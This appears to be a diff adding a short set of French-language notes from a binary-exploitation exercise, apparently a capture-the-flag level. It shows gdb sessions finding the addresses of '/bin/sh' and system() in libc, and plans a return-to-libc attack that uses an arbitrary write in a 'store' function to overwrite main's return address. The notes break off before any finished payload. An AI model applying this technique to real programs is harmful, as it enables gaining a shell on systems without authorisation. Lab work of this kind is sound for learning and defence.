@@ -1,0 +1,20 @@
+adresse de /bin/sh
+(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+0xf7f897ec
+(gdb) info function "system"
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+décomp, on voit que avec store, on peut écrire où on veut, on va changer adresse de retour dans la stack de main
+pour aller dans system, on réécrit aussi 4 octets plus loin l'adresse de "/bin/sh"
+
+il faut trouver l'adresse d'array, et l'adresse de l'adresse de retour sur la stack
+en lisant asm, on trouve array à 0x08(%ebp) dans la fun store_number 
+(gdb) x/x $ebp + 0x8
+0xffffd530:     0xffffd554
+
+0xffffd708
